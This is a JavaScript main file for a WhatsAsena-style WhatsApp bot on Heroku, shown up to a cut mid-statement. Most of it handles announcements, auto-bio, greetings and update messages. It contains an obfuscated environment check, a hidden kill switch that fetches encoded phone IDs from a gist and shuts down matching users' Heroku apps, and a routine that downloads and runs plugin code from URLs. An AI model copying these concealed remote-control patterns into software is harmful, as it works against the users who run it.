/* Copyright (C) 2020 ameer-kallumthodi.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

Pikachu - ameer-kallumthodi
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const axios = require('axios');
const Heroku = require('heroku-client');
const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
const {Message, StringSession, Image, Video} = require('./whatsasena/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = 'Blacklist Defected!'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const WhatsAsenaDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
      type: DataTypes.STRING,
      allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if(path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '905511384572,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
      return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function() { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function() {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function whatsAsena () {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
    var ggg = Buffer.from(clh.cd, 'base64')
    var ddd = ggg.toString('utf-8')
    clh.pay = ddd
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [2,2121,7];
    setInterval(async () => { 
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        await axios.get('https://gist.githubusercontent.com/phaticusthiccy/d0d1855bd0098d773759b4f3345bd292/raw/').then(async (ann) => {
            const { infotr, infoen, infoes, infopt, infoid, infoaz, infohi, infoml, inforu} = ann.data.announcements          
            if (infotr !== '' && config.LANG == 'TR') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ Günlük Duyurular ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoaz !== '' && config.LANG == 'AZ') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ Gündəlik Elanlar ]\n\n' + infoaz.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoes !== '' && config.LANG == 'ES') {
                while (getGMTh == 18 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ Anuncios Diarios ]\n\n' + infoes.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoen !== '' && config.LANG == 'EN') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ Daily Announcements ]\n\n' + infoen.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infohi !== '' && config.LANG == 'HI') {
                while (getGMTh == 21 && getGMTm == 31) { 
                    return conn.sendMessage(conn.user.jid, '[ दैनिक घोषणाएं ]\n\n' + infohi.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoml !== '' && config.LANG == 'ML') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ പ്രതിദിന പ്രഖ്യാപനങ്ങൾ ]\n\n' + infoml.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infoid !== '' && config.LANG == 'ID') {
                while (getGMTh == 23 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ Pengumuman Harian ]\n\n' + infoid.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (inforu !== '' && config.LANG == 'RU') {
                while (getGMTh == 19 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ Ежедневные объявления ]\n\n' + inforu.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
            else if (infopt !== '' && config.LANG == 'PT') {
                while (getGMTh == 17 && getGMTm == 1) { 
                    return conn.sendMessage(conn.user.jid, '[ Anúncios Diários ]\n\n' + infopt.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                }
            }
        })
    }, 50000);
    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_BİO
    });
    setInterval(async () => { 
        if (biography_var == 'true') {
            if (conn.user.jid.startsWith('90')) { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { // Azerbayjan
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Indian
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) { // France
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time +'\n\n🐺 WhatsAsena'
                await conn.setStatus(biography)
            }
        }
    }, 7890);
    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
    await config.DATABASE.sync();
    var StrSes_Db = await WhatsAsenaDB.findAll({
        where: {
          info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');  
    const one = buff.toString('utf-8'); 
    const bufft = Buffer.from(`${shl2}`, 'base64');  
    const two = bufft.toString('utf-8'); 
    const buffi = Buffer.from(`${lss3}`, 'base64');  
    const three = buffi.toString('utf-8'); 
    const buffu = Buffer.from(`${dsl4}`, 'base64');  
    const four = buffu.toString('utf-8'); 
    
    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION)); 
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on ('open', async () => {
        console.log(
            chalk.blueBright.italic('✅ Login Information Updated!')
        );
        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })    
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!')
        );
        console.log(
            chalk.blueBright.italic('⬇️ Installing External Plugins...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }     
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️  Installing Plugins...')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if(path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ Plugins Installed!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🐺 WhatsAsena' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? 'WhatsAsena Chatbot Olarak Çalışıyor! 🐺\n\n_Bu modun amacı botu tam fonksiyonel bir yapay zeka sohbet aracına çevirmektir.\n_Normal moda dönmek için .fulleva off komutunu kullanabilirsiniz.\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌\n    *- Eva' : 'WhatsAsena Working as a Chatbot! 🐺\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot.\n_You can use the .fulleva off command to return to normal mode.\n\n*Thanks For Using WhatsAsena 💌\n    *- Eva'
        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
            await conn.sendMessage(conn.user.jid,nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => { 
                forID = formation[0].id; 
                await heroku.patch(baseURI + '/formation/' + forID, { 
                    body: { 
                        quantity: 0 
                    } 
                });
            })
        }
        if (config.WORKTYPE == 'public') {
      
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, 'WhatsAsena Public Olarak Çalışıyor! 🐺\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır.\n_Herhangi bir sohbette komutları deneyebilirsiniz :)\n\n*Botunuz herkese açık bir şekilde çalışmaktadır. Değiştirmek için* .setvar WORK_TYPE:private komutunu kullanın.\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        'Güncellemek İçin .update now Yazın.\n\n' + degisiklikler + '', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '\n*sidzxbotus  Working as Public!😎*\n', MessageType.text);
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
        
                    await conn.sendMessage(
                        conn.user.jid,
                        'Type *.update now* For Update The Bot.\n\n' + degisiklikler + '', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == 'private') { 
            if (config.LANG == 'TR' || config.LANG == 'AZ') { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, 'WhatsAsena Private Olarak Çalışıyor! 🐺\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır.\n_Herhangi bir sohbette komutları deneyebilirsiniz :)\n\n*Botunuz sadece size özel olarak çalışmaktadır. Değiştirmek için* .setvar WORK_TYPE:public komutunu kullanın.\n\n*WhatsAsena Kullandığın İçin Teşekkürler 💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        'Güncellemek İçin .update now Yazın.\n\n' + degisiklikler + '', MessageType.text
                    ); 
                }
            }
            else { 
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '\n*sidzxbotus   Working as Private!😎\n\n_Please do not try plugins here. This is your LOG number.\n_You can try commands to any chat :)\n\n*Your bot working as private. To change it, use .setvar WORK_TYPE:public\n\n*Thanks for using WhatsAsena 💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );    
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' <' + commit.author_name + '>\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        'Type *.update now* For The Update Bot.\n\n' + degisiklikler + '', MessageType.text
                    ); 
                }
            }
        }
        else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                await conn.sendMessage(
                    conn.user.jid,
                    'Görünüşe Göre Private Moduna Geçmek İstiyorsun! Maalesef WORK_TYPE Anahtarın Yanlış! \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    'It Looks Like You Want to Switch to Private Mode! Sorry, Your WORK_TYPE Key Is Incorrect! \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                await conn.sendMessage(
                    conn.user.jid,
                    'Görünüşe Göre Public Moduna Geçmek İstiyorsun! Maalesef WORK_TYPE Anahtarın Yanlış! \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    'It Looks Like You Want to Switch to Public Mode! Sorry, Your WORK_TYPE Key Is Incorrect! \n_Dont Worry! I am Trying To Find The Right One For You.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        else {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                return await conn.sendMessage(
                    conn.user.jid,
                    'Girdiğin WORK_TYPE Anahtarı Bulunamadı! \n_Lütfen_ .setvar WORK_TYPE:private Yada .setvar WORK_TYPE:public Komutunu Kullanın!', MessageType.text
                );
            }
            else {
                return await conn.sendMessage(
                    conn.user.jid,
                    'The WORK_TYPE Key You Entered Was Not Found! \n_Please Type_ .setvar WORK_TYPE:private Or .setvar WORK_TYPE:public', MessageType.text
                );
            }
        }
    })
    conn.on('message-new', async msg => {
       
        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            if (gb !== false) {
                let pp
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = await getMessage(msg.key.remoteJid);
            if (gb !== false) {
               let pp
                try { pp = await conn.getProfilePicture(msg.messageStubParameters[0]); } catch { pp = await conn.getProfilePicture(); }
                await axios.get(pp, {responseType: 'arraybuffer'}).then(async (res) => {
                await conn.sendMessage(msg.key.remoteJid, res.data, MessageType.image, {caption:  gb.message }); });
            }
            return;
        }
        // ==================== End Greetings ====================

        // ==================== Blocked Chats ====================
        if (config.BLOCKCHAT !== false) {     
            var abc = config.BLOCKCHAT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? abc.includes(msg.key.remoteJid.split('@')[0]) : abc.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT == '905524317852-1612300121') {     
            var sup = config.SUPPORT.split(',');                            
            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT2 == '905511384572-1617736751') {     
            var tsup = config.SUPPORT2.split(',');                            
            if(msg.key.remoteJid.includes('-') ? tsup.includes(msg.key.remoteJid.split('@')[0]) : tsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        if (config.SUPPORT3 == '905511384572-1621015274') {     
            var nsup = config.SUPPORT3.split(',');                            
            if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
        }
        // ==================== End Blocked Chats ====================

        // ==================== Events ====================
        events.commands.map(
            async (command) =>  {
                if (msg.message && msg.message.imageMessage && msg.message.imageMessage.caption) {
                    var text_msg = msg.message.imageMessage.caption;
                } else if (msg.message && msg.message.videoMessage && msg.message.videoMessage.caption) {
                    var text_msg = msg.message.videoMessage.caption;
                } else if (msg.message) {
                    var text_msg = msg.message.extendedTextMessage === null ? msg.message.conversation : msg.message.extendedTextMessage.text;
                } else {
                    var text_msg = undefined;
                }
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    && msg.message && msg.message.imageMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg)))) || 
                    (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                    (command.on !== undefined && command.on === 'text' && text_msg) ||
                    // Video
                    (command.on !== undefined && (command.on === 'video')
                    && msg.message && msg.message.videoMessage !== null && 
                    (command.pattern === undefined || (command.pattern !== undefined && 
                        command.pattern.test(text_msg))))) {

                    let sendMsg = false;
                    var chat = conn.chats.get(msg.key.remoteJid)
                        
                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
